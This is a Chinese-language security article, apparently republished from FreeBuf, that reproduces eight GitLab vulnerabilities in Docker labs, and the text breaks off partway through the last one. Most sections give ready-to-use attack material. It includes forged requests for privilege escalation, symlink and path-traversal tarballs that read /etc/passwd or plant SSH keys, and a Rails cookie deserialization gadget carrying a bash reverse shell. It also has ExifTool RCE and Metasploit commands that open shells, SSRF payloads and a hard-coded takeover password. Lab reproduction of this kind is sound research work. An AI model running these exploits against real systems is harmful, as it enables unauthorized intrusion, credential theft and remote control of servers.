#  GitLab漏洞汇总   
 实战安全研究   2024-12-03 14:37  
  
本文首发于freebuf，原文地址：  
  
https://www.freebuf.com/vuls/411902.html  
## 申明：本文仅供技术交流，请自觉遵守网络安全相关法律法规，切勿利用文章内的相关技术从事非法活动，如因此产生的一切不良后果与文章作者无关。  
##   
## 0x00 介绍  
  
GitLab是一款Ruby开发的Git项目管理平台，主要针对软件开发过程中产生的代码和文档进行管理。  
  
Gitlab主要针对group和project两个维度进行代码和文档管理。其中group是群组, project是工程项目, 一个group可以管理多个project, 一个project中可能包含多个branch, 意为每个项目中有多个分支。  
  
笔者在平时的渗透测试工作中，经常会碰到gitlab，于是特对gitlab常见漏洞进行汇总。  
## 0x01 普通用户提权至root（CVE-2016-4340）  
### 一、漏洞描述  
  
gitlab   
8.7.0、8.6.0 至 8.6.7、8.5.0 至 8.5.11、8.4.0 至 8.4.9、8.3.0 至 8.3.8 和 8.2.0 至 8.2.4版本  
中的Impersonate(模拟)功能  
允许经过身份验证的用户通过未指定的向量以任何其他用户的身份“登录”。  
### 二、环境搭建  
  
使用8.7.0版本来搭建复现环境  
```
sudo docker pull gitlab/gitlab-ce:8.7.0-ce.0
sudo docker run -it -p 443:443 -p 80:80 -p 222:22 -d image_id
```  
  
访问http://yourip  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcQsCNTWTxibbqwTqfvlUQUu9Ad8icNNJIAhMvRxHatmJiaicmrEKlJf8bQg/640?wx_fmt=png&from=appmsg "")  
  
修改密码，然后使用root/你修改的密码进行登录，创建一个普通用户：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKc3OqGXDQBNLCybOVEPewdMmYWNqia1cJ5QEtEIHyUFB8yjsBzrq9PicVA/640?wx_fmt=png&from=appmsg "")  
  
创建用户时是不能设置密码的，点击create user后再点击edit设置用户密码：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcn81WVKrvDRo4tJVay7HpBwgWQTPQibf6XYvgLMpPFSUVSD9kec2Y4Jw/640?wx_fmt=png&from=appmsg "")  
  
创建好后退出root用户。  
### 三、漏洞复现  
  
以普通用户test登录gitlab，创建新项目：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcoJAE0XpEViaAoZYqAzydCAiaseO7emPHehJoUH5NQIJWIlCmVRic3Ovhg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcO9aia7jaOL2GjKtLV8oU1VgmicBplwLQgRBdoq7adAGnA7u1aFbbvr6g/640?wx_fmt=png&from=appmsg "")  
  
点击create project时抓包，获取  
authenticity_token的值，此处为4c%2B%2B0lojTsb8vdX8dQ1kK4EHwSfGSwBDsQqBaVF%2FakYLmaxL3%2FOxNYWrwgupOnX%2FAowIyxbBZkIloix%2FwzybEA%3D%3D  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKclU7TVBD41eUVcJDYKiba4ib1ibg45ic9AFibbazBPSe138Lib3ttL6pWWgZw/640?wx_fmt=png&from=appmsg "")  
  
放行数据包，浏览器中访问  
/admin/users/stop_impersonation?id=root抓包，将请求方式改为post，发送的数据包如下：  
```
POST /admin/users/stop_impersonation?id=root HTTP/1.1
Host: 10.211.55.5
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Cookie: sessionid=s5845t7zkd9sxtaa4enrlpkq482w74bb; _gitlab_session=c889f67cb4f145a7dd8ccb9d4cbeb1b8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

_method=delete&authenticity_token=4c%2B%2B0lojTsb8vdX8dQ1kK4EHwSfGSwBDsQqBaVF%2FakYLmaxL3%2FOxNYWrwgupOnX%2FAowIyxbBZkIloix%2FwzybEA%3D%3D其中authenticity_token为创建项目时获取到的值
```  
  
其中authenticity_token为创建项目时获取到的值  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcmWaib2CTDZ4v0f22oP2OxgHkBOFFj8xE5182bG8rGJJaVwico5LNMsrA/640?wx_fmt=png&from=appmsg "")  
  
提权到了root：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKc2uHLzicdsWRqTwlgJgga5jqfsjrj6u8o0d0L254o0Jn1eawRRJkAQfA/640?wx_fmt=png&from=appmsg "")  
## 0x02 任意用户authentication_token泄露和任意文件读取（CVE-2016-9086）  
### 一、漏洞描述  
  
GitLab 8.9.x 及以上版本在 GitLab 的“导入/导出项目”功能中存在一个严重的安全漏洞。此功能在 GitLab 8.9 中新增，允许用户将其项目导出然后重新导入为磁带存档文件 (tar)。8.13.0 之前的所有 GitLab 版本都限制此功能仅限管理员使用。从 8.13.0 版本开始，此功能可供所有用户使用。此功能未正确检查用户提供的存档中的符号链接，因此经过身份验证的用户可以检索 GitLab 服务帐户可访问的任何文件的内容。这包括敏感文件，例如包含 GitLab 服务用于验证用户的秘密令牌的文件。 GitLab CE 和 EE 版本 8.13.0 至 8.13.2、8.12.0 至 8.12.7、8.11.0 至 8.11.10、8.10.0 至 8.10.12 以及 8.9.0 至 8.9.11 均受到影响。  
  
而“导入/导出项目”功能在GitLab CE 和 EE 版本 8.10.3-8.10.5还存在任意用户authentication_token泄露。  
  
这两个漏洞由jobert分别于2016年8月和10月在hackone上披露：  
  
https://hackerone.com/reports/158330  
  
https://hackerone.com/reports/178152  
### 二、环境搭建  
  
为了能同时复现这两个漏洞采用GitLab CE 8.10.5来搭建漏洞环境  
```
sudo docker pull gitlab/gitlab-ce:8.10.5-ce.0
sudo docker run -it -p 443:443 -p 80:80 -p 222:22 -d image_id
```  
  
接下来和使用和上面一样的方法来创建普通用户test，此处不赘述。  
### 三、漏洞复现  
#### 1.任意用户authentication_token泄露  
  
登录普通用户test，创建一个新项目，创建好之后在项目的member选项中将管理员添加进来：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcwwk2xicN64Fd5TnnVwvXLwjjB0iaQWyOV2SOR14Se5droxiauwrd0k7FA/640?wx_fmt=png&from=appmsg "")  
  
点击edit project  
，找到Export project  
部分，点击Export project  
，等待几分钟去查看注册邮箱收到的下载地址或者刷新页面，点击Download export  
下载导出包：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcUKGKbg1S4EpwJw9a3YNkow9yonLuoEpXHSqBsHDC4bVpBOoibOtxejA/640?wx_fmt=png&from=appmsg "")  
  
导出包的project.json  
中已经含有了管理员的authentication_token  
：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcQZE7oPzpzib4vwhISCDZbmQEHU7mr9ibMAxRe4EPZAiaomStdKVLnzWKg/640?wx_fmt=png&from=appmsg "")  
  
得到authentication_token  
之后我们就可以通过api  
做管理员可以做的事情了，比如查看管理员所在的项目：  
  
http://10.211.55.5/api/v3/projects?private_token=smgmXn_dWKxjxDxmeA3t  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcJ2Rw1LMIZmMRtOYfO4viaDmbQAom9cZ3zLUYBkFalzAwu5vJr7nSWuA/640?wx_fmt=png&from=appmsg "")  
#### 2.任意文件读取  
  
首先利用之前导出的项目准备压缩包：  
```
ln -sf /etc/passwd project.json
tar zcf test.tar.gz ./
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcBWM3H5zEE3bnsKLMfsYD8fwe5clQ51xOcNrZGqxUibJrz1oqwWX6WlQ/640?wx_fmt=png&from=appmsg "")  
  
由于此处版本为8.10.5故需要使用管理员权限才能复现，创建新项目：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKc5O6oE74ibF3fVMicCHVPNRzrSuibTibdE4KLh10OFfuSJy7GreD9I7IknA/640?wx_fmt=png&from=appmsg "")  
  
上传构造好的test.tar.gz，点击import project：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcDqJEeEbpbuExrB0ne7daYAd2H5olmPy4RKSg8cQWeyuRK8em4UWaRQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcKl4jqnOXxWh1VKibohkjcaiaxqrjwOeWzXcwADR4iaSoICXjB1icHvV34g/640?wx_fmt=png&from=appmsg "")  
  
成功读取/etc/passwd：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKc7Xqo7hicNDJjwuYeekOZIZzDhaD0bTnDibgl7R0dAp0EXic3PCFiavjwxQ/640?wx_fmt=png&from=appmsg "")  
  
关于漏洞的分析请参考404实验室的这篇paper：  
  
https://paper.seebug.org/104/  
## 0x03 任意文件写入导致远程命令执行（CVE-2018-14364）  
### 一、漏洞描述  
  
GitLab 社区版和企业版 10.7.7 之前、10.8.6 之前的 10.8.x 以及 11.0.4 之前的 11.x 允许通过 GitLab 项目导入组件进行具有写访问权限的目录遍历并由此导致的远程代码执行。  
### 二、环境搭建  
  
使用11.0.3版本来搭建漏洞环境  
```
sudo docker pull gitlab/gitlab-ce:11.0.3-ce.0
sudo docker run -it -p 443:443 -p 80:80 -p 222:22 -d image_id
```  
  
创建test用户，此处不赘述。  
### 三、漏洞复现  
  
首先说一下，制作压缩包时应当在linux上进行，我在macos上进行最后会导致复现失败，应该是linux与macos对于路径中特殊字符的处理不一样而导致的。  
#### 1.第一步，在攻击机上生成一对密钥  
  
我的攻击机为kali  
```
ssh-keygen -t rsa
```  
  
然后根据提示进行输入即可：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKc3h4R1Nxn18Jbr5ScUP2BKLAnaXYia6tK5FzVLOO4CEWXIxv8PI2SxUg/640?wx_fmt=png&from=appmsg "")  
#### 2.第二步，制作压缩包  
  
压缩包的模板采用漏洞原作者在hackone上提供的：  
  
https://hackerone.com/reports/378148  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcanpsNBNEtwiaexjHZye71kwav2JrOgTQpj3lHabXrcBWHj3jx7suXGA/640?wx_fmt=png&from=appmsg "")  
  
第一个压缩包直接用，我这里将其改名为evil1.tar.gz；  
  
第二个压缩包进行解压，将uploads目录中authorized_keys文件的内容改为刚才生成的公钥  
```
cd ~/Downloads
mv tarball1.tar.gz evil1.tar.gz
mkdir evil&&tar -zxvf tarball2.tar.gz -C evil //将tarball2.tar.gz解压到evil目录
cd uploads&&ls -al
cd '.'$'\n''evil'&&ls -al
cd .ssh
cat ~/.ssh/id_rsa.pub > authorized_keys //将公钥写入authorized_keys
cat authorized_keys
cd ~/Downloads/evil
tar czf ../evil2.tar.gz project.json uploads VERSION //重打包
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcql7SAUbwcCYPJTgAs6RHg8wgDGRZf7yKCgYJewXqdaD2ialeH7ibvrVw/640?wx_fmt=png&from=appmsg "")  
  
可以看到压缩包中.\nevil  
特殊目录，在kali上显示为'.'$'\n''evil'  
：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcoIfsdVH0aTLTk1lvrZSNyueJtAiaX1NqAUaJYSbbNPZP3wFzNsNRamg/640?wx_fmt=png&from=appmsg "")  
  
将公钥写入authorized_keys  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcquUsXT8cnBicwFwRznhQ2d4njGUic4chtFBQKIxgml5kKFxOOicRcOwZw/640?wx_fmt=png&from=appmsg "")  
  
重打包：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKc1oDeJ79msJzuWCNqWe3zkARmD3bgqZ1VaXJpyyVLLGbhoicAnkcg4TA/640?wx_fmt=png&from=appmsg "")  
#### 3.第三步，上传压缩包  
  
创建新项目，选择从导出包上传：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcDwZBBE8ufLCFECtdsmXQibxiahicibMnQTtAcuwG4GwlnAHIvPXamuGuqQ/640?wx_fmt=png&from=appmsg "")  
  
先上传evil1.tar.gz：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKczuTViaRmSPZ9T3gXvwbVhfjsqPUQVegaQOrnyFJz9ahFibX9iaktTBL9Q/640?wx_fmt=png&from=appmsg "")  
  
上传成功后移除项目：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKc3gN6fdLsh6Y0v3tV8ooicYXj5tzseCdJ1RT1bQNxpWSJlS0qibDSicmrA/640?wx_fmt=png&from=appmsg "")  
  
但此时服务器上仍然保留了该项目的文件：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcPUsZbTiaAE5yh2nJC2HvqFetKMqwGVZTnnHIpxiba03xH9I29mpZNx8w/640?wx_fmt=png&from=appmsg "")  
  
再创建跟刚才相同项目名的新项目，上传evil1.tar.gz：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKc9uW7Oomkd3EA9EicGDQuzwhZM1otwHo3jCnle2y6ibazia73yPDkGSFEg/640?wx_fmt=png&from=appmsg "")  
  
导入成功：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcte5poHZpxQBBU7O94ibcQCxTFU41fUQQXFqiaYhtTe9iaeiaQmvfwkUasg/640?wx_fmt=png&from=appmsg "")  
  
此时查看服务器上/var/opt/gitlab/.ssh/authorized_keys  
，会看见第一步创建的公钥被写入：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcic4cnMH67CUpcFPkPpXFp6h5lyTLWv13VicgN6MOibtTn7RdFXdTcYIxw/640?wx_fmt=png&from=appmsg "")  
#### 4.第四步，使用私钥连接服务器，获取权限  
```
ssh -i ~/.ssh/id_rsa git@ip
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcWh9qGXLkPezdq18icOX8ZtOPzlW3XicLE6YsS99m3yCocGn6Nyic9cupA/640?wx_fmt=png&from=appmsg "")  
  
有关该漏洞的原理分析请参考：  
  
https://chybeta.github.io/2018/09/10/GitLab%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-14364%E3%80%91/  
  
https://www.cnblogs.com/0x28/p/15685245.html  
## 0x04 任意文件读取导致远程命令执行漏洞（CVE-2020-10977）  
### 一、漏洞描述  
  
GitLab EE/CE 8.5 至 12.9.0在项目之间移动 issue 时容易受到路径遍历的影响，可造成任意文件读取。该漏洞在 12.9.1、12.8.8 和 12.7.8 中得到修复。当引入易受攻击的 experimentation_subject_id  
cookie 时，RCE 仅影响 版本 12.4.0 及更高版本。  
  
关于该漏洞的最初报告详情请看：  
  
https://hackerone.com/reports/827052  
### 二、环境搭建  
  
采用12.8.7版本来进行复现  
```
sudo docker pull gitlab/gitlab-ce:12.8.7-ce.0
sudo docker run -it -p 443:443 -p 80:80 -p 222:22 -d image_id
```  
### 三、漏洞复现  
#### 1.任意文件读取  
  
新建两个项目test1和test2  
  
在test1中新建issue，其中的Description中填入：  
```
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
```  
  
提交后点击Move issue，将其移动到test2  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcLJIGBL8uDibjSqZIZJZfR3Lf5PgZRAwn2UibWHYve7FzHibD12XJ8Ksjg/640?wx_fmt=png&from=appmsg "")  
  
接着会在test2的issue中看到一个passwd附件，点击下载，然后用文本打开：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKc4bWHv18XK5Hic5ess46lVibDD7vgwlTyicJkOhiazsQGNdXUke7lVomnLQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcfeYtfuz55P9z8cKg2AIAED9RdLPvgqpoeGTxbiaIY5ib6tNKdE0G1grg/640?wx_fmt=png&from=appmsg "")  
#### 2.远程代码执行  
  
首先利用文件读取漏洞，读取/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml  
文件，获取secret_key_base  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcGxxqwRr93s5KqxjbcPUs9nHB0QpLocmuqlHYiclsicSLfSV6l0kGhT9Q/640?wx_fmt=png&from=appmsg "")  
  
可以看到此处为：  
```
secret_key_base: 2fa81f053d43c58f403a39534432f41b73b8d15c21b9450e523d7188e10235b286d42e85a6ee76639163ad77d9ba8e58176cc0849374a7e6b22c803a6ca8a24e
```  
  
在本机启动一个gitlab，此处我的版本为11.0.3，建议本机启动的版本与目标机版本一致。将本地的/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml  
进行替换，我这里只替换了其中的secret_key_base  
。  
  
然后终端输入gitlab-rails console  
 进入rails console：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKc7ibpEgHDFGBu48wRibl0tBypicGnb8sR88XNxjTJUeEj4AHv6xbHib4pnQ/640?wx_fmt=png&from=appmsg "")  
  
在console中依次输入：  
```
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar
erb = ERB.new("<%= `bash -c 'bash -i >& /dev/tcp/10.211.55.3/9999 0>&1'` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```  
  
会获得一个cookie：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKc357KVID03X3n8uDpKBsqsE5EsgyLXG2LHhxMjsJsZNu5XXLv3SChBg/640?wx_fmt=png&from=appmsg "")  
  
注意：在console中进行输入时，命令会被执行一次，故获取到cookie后再进行监听  
  
然后在kali 10.211.55.3上开启监听，本机上携带cookie访问：  
```
curl -vvv 'http://10.211.55.5/users/sign_in' -b "experimentation_subject_id=cookie"
```  
  
攻击机上收到shell：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcibJicVUCrnfr53pAJbib1yRYR9aGSxDWTiboGyzNH37aZuCwxMoxSiak4uw/640?wx_fmt=png&from=appmsg "")  
  
msf中也集成了从文件读取到RCE的模块，也可用msf一键RCE（机智）：  
```
msfconsole
use exploit/multi/http/gitlab_file_read_rce
set payload generic/shell_reverse_tcp
set rhosts 10.211.55.5
set USERNAME test
set PASSWORD test1234
set lhost 10.211.55.3
set lport 12345
exploit
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcUducsFXsQv13L74icZhouKht4jsibRUhuAiavrEbg0OzKrQFLylRPAGjA/640?wx_fmt=png&from=appmsg "")  
## 0x05 GitLab CI Lint API 未授权SSRF漏洞（CVE-2021-22214）  
### 一、漏洞描述  
  
Gitlab的CI lint API用于验证提供给gitlab ci的配置文件是否是yaml格式。而根据其说明文档，其include 操作支持remote选项，用于获取远端的yaml。因此在此处将remote参数设置为本地回环地址，同时由于后端会检查最后扩展名，加上?test.yaml 即可绕过。远程攻击者可通过发送特殊构造的 HTTP 请求，欺骗应用程序向任意系统发起请求。攻击者成功利用该漏洞可获得敏感数据的访问权限或向其他服务器发送恶意请求。  
  
该漏洞影响以下版本gitlab：  
  
10.5 <= GitLab < 13.10.5  
  
13.11 <= GitLab < 13.11.5  
  
13.12 <= GitLab < 13.12.2  
### 二、环境搭建  
  
采用 13.11.4 版本来复现  
```
sudo docker pull gitlab/gitlab-ce:13.11.4-ce.0
sudo docker run -it -p 443:443 -p 80:80 -p 222:22 -d image_id
```  
### 三、漏洞复现  
  
发送如下数据包：  
```
POST /api/v4/ci/lint HTTP/1.1
Host: 10.211.55.5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:129.0) Gecko/20100101 Firefox/129.0
User-Agent: python-requests/2.25.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: application/json
Content-Length: 111

{ "include_merged_yaml": true, "content":"include:\n remote: http://zuujki.dnslog.cn/api/v1/targets/?test.yml"}
```  
  
dnslog上收到请求：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcV6MCD1FLSoUTs8tHSpzJ9CQGAUaEjica7yKG4FJ3ob529xUYR8vKqdg/640?wx_fmt=png&from=appmsg "")  
  
或者命令行执行：  
```
curl -s --show-error -H 'Content-Type: application/json' http://10.211.55.5/api/v4/ci/lint --data '{ "include_merged_yaml": true, "content": "include:\n  remote: http://ocmnxo.dnslog.cn/api/v1/targets/?test.yml"}'
```  
  
dnslog收到请求：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKc8OX5Vybw278QmRRvjic2x4vdYjnvUibPolKfoZoy8A1tyu8eFNlNY2ng/640?wx_fmt=png&from=appmsg "")  
## 0x06  ExifTool未授权远程命令执行（CVE-2021-22205）  
### 一、漏洞描述  
  
11.9以后的GitLab中，因为使用了图片处理工具ExifTool而受到漏洞CVE-2021-22204的影响，攻击者可以通过一个未授权的接口上传一张恶意构造的图片，进而在GitLab服务器上执行命令。  
  
该漏洞影响以下GitLab企业版和社区版：  
11.9 <= Gitlab CE/EE < 13.8.8  
13.9 <= Gitlab CE/EE < 13.9.6  
13.10 <= Gitlab CE/EE < 13.10.3  
### 二、环境搭建  
  
采用13.10.2版本来复现  
```
sudo docker pull gitlab/gitlab-ce:13.10.2-ce.0
sudo docker run -it -p 443:443 -p 80:80 -p 222:22 -d image_id
```  
### 三、漏洞复现  
  
使用  
https://github.com/Al1ex/CVE-2021-22205  
脚本来复现  
  
验证漏洞是否存在：  
```
python3 CVE-2021-22205.py -v true -t http://10.211.55.5
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKc1W0HbOCfL3HOCAhrdz0W1jNJa6w8NPfTViaepRYA2vxtTl2H5V0OFXA/640?wx_fmt=png&from=appmsg "")  
  
反弹shell：  
```
python3 CVE-2021-22205.py -a true -t http://10.211.55.5 -c "bash -c 'bash -i >& /dev/tcp/10.211.55.3/1234 0>&1'"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKc9Kic4mhhohjmkXEbQP9xGoJ6KtbUTjEmrHicJtEoOibDKUguafYGUN49g/640?wx_fmt=png&from=appmsg "")  
## 0x07 Gitlab 硬编码漏洞（CVE-2022-1162）  
### 一、漏洞概述  
  
GitLab官方描述，系统会默认给使用了 OmniAuth 程序（例如 OAuth、LDAP、SAML）注册的帐户设置一个硬编码密码  
123qweQWE!@#000000000  
，从而允许攻击者可直接通过该硬编码密码登录并接管帐户  
。  
  
该漏洞影响以下GitLab企业版和社区版：  
14.7 <= Gitlab CE/EE < 14.7.7  
14.8 <= Gitlab CE/EE < 14.8.5  
14.9 <= Gitlab CE/EE < 14.9.2  
  
参考链接：  
  
https://xz.aliyun.com/t/11236  
### 二、环境搭建  
  
使用14.7.4版本进行复现  
  
环境搭建参考链接：  
  
https://blog.csdn.net/qq_44281295/article/details/127813365  
  
该漏洞的环境搭建需要接入github认证  
  
登录自己的github，注册一个OAuth application  
  
头像—Settings--Developer settings--OAuth Apps：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKceZYUWt1k4f8VXF1yTbEStwcAOPgC2hf20oygZDqyRUib0iberYU6iay4g/640?wx_fmt=png&from=appmsg "")  
  
获取Client ID和Client secrets，进入容器，修改  
/etc/gitlab/gitlab.rb  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKc9NglSNpU195M6XsU0l3SiaibM4S6nuuO5KpHbh3429ublmeep2PicM7fQ/640?wx_fmt=png&from=appmsg "")  
  
重启容器，sudo docker restart container_id  
  
通过github注册账户：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcTMgfV8WootV5WOfy4icoWcffXfl96blVm6kdicEJ9ut2cJ44zW4GxVHQ/640?wx_fmt=png&from=appmsg "")  
  
进入容器，查看root账户初始密码：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKccibK6x5ia6wlRpP9EPVZQk5u4K3keNuLtVAWEe2GBcP5BsAiar87ynfzw/640?wx_fmt=png&from=appmsg "")  
  
登录root账户，激活刚才注册的用户  
###   
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKc7eVU2kdq4iac6vGL8aVlyBWIOaH5UJmWVx9JmDdxOyHENpt710S7PxA/640?wx_fmt=png&from=appmsg "")  
  
退出root用户。  
### 三、漏洞复现  
  
使用账户walker1995/  
123qweQWE!@#000000000即可进行登录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcTmeoNBicmWGwyiauQrsOOYHlltCZSq2BcHy7l0H9OXqlFk4NydSnQ1iag/640?wx_fmt=png&from=appmsg "")  
  
在实际利用中，可以通过固定密码，爆破用户名来接管用户。  
  
若gitlab中的用户有公开项目，则可利用脚本来枚举用户，从而接管账户。  
  
利用脚本：  
  
https://github.com/ipsBruno/CVE-2022-1162  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcPoEnu2ia4G3iacHyiclprF3CicGS9mBoAYFHnJunVIW2UaZ9Ij77Vg3pWA/640?wx_fmt=png&from=appmsg "")  
## 0x08 bulk_import 授权项目导入RCE（CVE-2022-2185）  
### 一、漏洞概述  
  
在14.0 <= GitLab CE/EE < 14.10.5、15.0 <= GitLab CE/EE < 15.0.4、15.1 <= GitLab CE/EE < 15.1.1版本中，经过身份验证的用户可以导入恶意制作的项目，从而导致远程代码执行。  
  
该漏洞的详细分析：  
  
https://starlabs.sg/blog/2022/07-gitlab-project-import-rce-analysis-cve-2022-2185/  
### 二、环境搭建  
  
使用15.0.3版本进行复现  
```
sudo docker pull gitlab/gitlab-ce:15.0.3-ce.0
sudo docker run -it -p 443:443 -p 80:80 -p 222:22 -d image_id
sudo docker exec -it container_id /bin/bash  //进入容器
cat /etc/gitlab/initial_root_password  //查看root初始密码
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcnNLRz2riaxcyExq49o8vyRsRS4REmAsxShNhcl4uYPWLNzhysUZPXhw/640?wx_fmt=png&from=appmsg "")  
  
使用root账户创建一个普通用户test。  
  
**注：**  
复现该漏洞时目标机器也在互联网，内网搭建环境复现不成功。  
### 三、漏洞复现  
  
直接使用脚本，github地址：  
  
https://github.com/star-sg/CVE/tree/master/CVE-2022-2185  
  
恶意vps上启动api.py  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcBhtFS9aHSj7iatuFRK4HxuahOJtvSpVhJWwoORTVtic8l5vMIBQIgceQ/640?wx_fmt=png&from=appmsg "")  
  
修改poc.py如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CFEQEjGaicCNtyJmLOHDMZcrfrTvtfsKcQ8rHQ8VZuPWdACWkOicq0bJVztybmsJRgEUUfJgZE8OKWDI6s3d1VHA/640?wx_fmt=png&from=appmsg "")  
  
恶意vps上开启nc监听，使用python2执行poc.py后，恶意vps上收到来自目标机器的请求：  
  
